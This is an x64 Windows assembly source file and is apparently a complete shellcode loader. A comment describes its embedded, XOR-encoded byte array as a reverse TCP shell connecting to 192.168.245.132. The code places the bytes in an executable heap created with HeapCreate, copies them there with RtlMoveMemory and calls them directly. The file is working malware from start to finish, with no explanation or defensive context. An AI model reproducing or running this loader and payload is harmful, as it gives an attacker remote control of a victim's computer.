extrn HeapCreate :PROC
extrn HeapAlloc :PROC
extrn RtlMoveMemory :PROC

.data
;shellcode reverse tcp connection to 192.168.245.132
shellcode DB 48H,31H,0C9H,48H,81H,0E9H,0C6H,0FFH
	DB 0FFH,0FFH,48H,8DH,05H,0EFH,0FFH,0FFH
	DB 0FFH,48H,0BBH,72H,0B4H,30H,0EAH,8DH
	DB 0BEH,0FEH,70H,48H,31H,58H,27H,48H
	DB 2DH,0F8H,0FFH,0FFH,0FFH,0E2H,0F4H,8EH
	DB 0FCH,0B3H,0EH,7DH,56H,3EH,70H,72H
	DB 0B4H,71H,0BBH,0CCH,0EEH,0ACH,21H,24H
	DB 0FCH,01H,38H,0E8H,0F6H,75H,22H,12H
	DB 0FCH,0BBH,0B8H,95H,0F6H,75H,22H,52H
	DB 0FCH,0BBH,98H,0DDH,0F6H,0F1H,0C7H,38H
	DB 0FEH,7DH,0DBH,44H,0F6H,0CFH,0B0H,0DEH
	DB 88H,51H,96H,8FH,92H,0DEH,31H,0B3H
	DB 7DH,3DH,0ABH,8CH,7FH,1CH,9DH,20H
	DB 0F5H,61H,0A2H,06H,0ECH,0DEH,0FBH,30H
	DB 88H,78H,0EBH,5DH,35H,7EH,0F8H,72H
	DB 0B4H,30H,0A2H,08H,7EH,8AH,17H,3AH
	DB 0B5H,0E0H,0BAH,06H,0F6H,0E6H,34H,0F9H
	DB 0F4H,10H,0A3H,8CH,6EH,1DH,26H,3AH
	DB 4BH,0F9H,0ABH,06H,8AH,76H,38H,73H
	DB 62H,7DH,0DBH,44H,0F6H,0CFH,0B0H,0DEH
	DB 0F5H,0F1H,23H,80H,0FFH,0FFH,0B1H,4AH
	DB 54H,45H,1BH,0C1H,0BDH,0B2H,54H,7AH
	DB 0F1H,09H,3BH,0F8H,66H,0A6H,34H,0F9H
	DB 0F4H,14H,0A3H,8CH,6EH,98H,31H,0F9H
	DB 0B8H,78H,0AEH,06H,0FEH,0E2H,39H,73H
	DB 64H,71H,61H,89H,36H,0B6H,71H,0A2H
	DB 0F5H,68H,0ABH,0D5H,0E0H,0A7H,2AH,33H
	DB 0ECH,71H,0B3H,0CCH,0E4H,0B6H,0F3H,9EH
	DB 94H,71H,0B8H,72H,5EH,0A6H,31H,2BH
	DB 0EEH,78H,61H,9FH,57H,0A9H,8FH,8DH
	DB 4BH,6DH,0A3H,33H,0C9H,8DH,42H,2DH
	DB 87H,02H,0EAH,8DH,0FFH,0A8H,39H,0FBH
	DB 52H,78H,6BH,61H,1EH,0FFH,70H,72H
	DB 0FDH,0B9H,0FH,0C4H,02H,0FCH,70H,63H
	DB 0E8H,0F0H,42H,78H,3AH,0BFH,24H,3BH
	DB 3DH,0D4H,0A6H,04H,4FH,0BFH,0CAH,3EH
	DB 0C3H,16H,0EDH,72H,6BH,0B2H,0F9H,98H
	DB 0DCH,31H,0EBH,8DH,0BEH,0A7H,31H,0C8H
	DB 9DH,0B0H,81H,8DH,41H,2BH,20H,22H
	DB 0F9H,01H,23H,0C0H,8FH,3EH,38H,8DH
	DB 74H,78H,63H,4FH,0F6H,01H,0B0H,3AH
	DB 3DH,0F1H,0ABH,37H,54H,0F1H,0AFH,92H
	DB 4BH,0E5H,0A2H,04H,79H,94H,60H,33H
	DB 0ECH,7CH,63H,6FH,0F6H,77H,89H,33H
	DB 0EH,0A9H,4FH,0F9H,0DFH,01H,0A5H,3AH
	DB 35H,0F4H,0AAH,8FH,0BEH,0FEH,39H,0CAH
	DB 0D7H,5DH,8EH,8DH,0BEH,0FEH,70H,72H
	DB 0F5H,60H,0ABH,0DDH,0F6H,77H,92H,25H
	DB 0E3H,67H,0A7H,0BCH,7EH,94H,7DH,2BH
	DB 0F5H,60H,08H,71H,0D8H,39H,34H,56H
	DB 0E0H,31H,0EBH,0C5H,33H,0BAH,54H,6AH
	DB 72H,30H,82H,0C5H,37H,18H,26H,22H
	DB 0F5H,60H,0ABH,0DDH,0FFH,0AEH,39H,8DH
	DB 74H,71H,0BAH,0C4H,41H,36H,3DH,0FBH
	DB 75H,7CH,63H,4CH,0FFH,44H,09H,0BEH
	DB 8BH,0B6H,15H,58H,0F6H,0CFH,0A2H,3AH
	DB 4BH,0FAH,61H,83H,0FFH,44H,78H,0F5H
	DB 0A9H,50H,15H,58H,05H,0EH,0C5H,0D0H
	DB 0E2H,71H,50H,2BH,2BH,43H,0EDH,8DH
	DB 61H,78H,69H,49H,96H,0C2H,76H,0EH
	DB 0BEH,0B0H,11H,6DH,0CBH,0FBH,0CBH,35H
	DB 0A7H,42H,85H,0E7H,0BEH,0A7H,31H,0FBH
	DB 6EH,0CFH,3FH,8DH,0BEH,0FEH,70H
endshellcode	DB 0

baseAddr DQ ?
heapHandle DQ ?
shellcodelenght DQ ?


.code
Start PROC
SUB rsp, 28h

lea rax, shellcode
lea rbx, endshellcode
SUB rbx, rax
MOV	shellcodelenght, rbx

;;SHELLCODE LOADER
; Create a heap with HeapCreate
MOV rcx, 40000h
MOV rdx, 1000h ; dwInitialSize
MOV r8, 0 ; dwMaximumSize
CALL HeapCreate
MOV heapHandle, rax ; HeapCreate return to heaphandle variable

; Allocate memory with HeapAlloc
MOV rcx, heapHandle ; hHeap
XOR rdx, rdx ; dwFlags
MOV r8, 100h ; dwBytes
CALL HeapAlloc
MOV baseAddr, rax ; Heap Allo return to baseAddr variable

; Copy shellcode to allocated memory with RtlMoveMemory
MOV rcx, baseAddr ; Destination
LEA rdx, shellcode ; Source
MOV r8, shellcodelenght ; Length
CALL RtlMoveMemory

; Execute shellcode
CALL baseAddr


Start ENDP
END
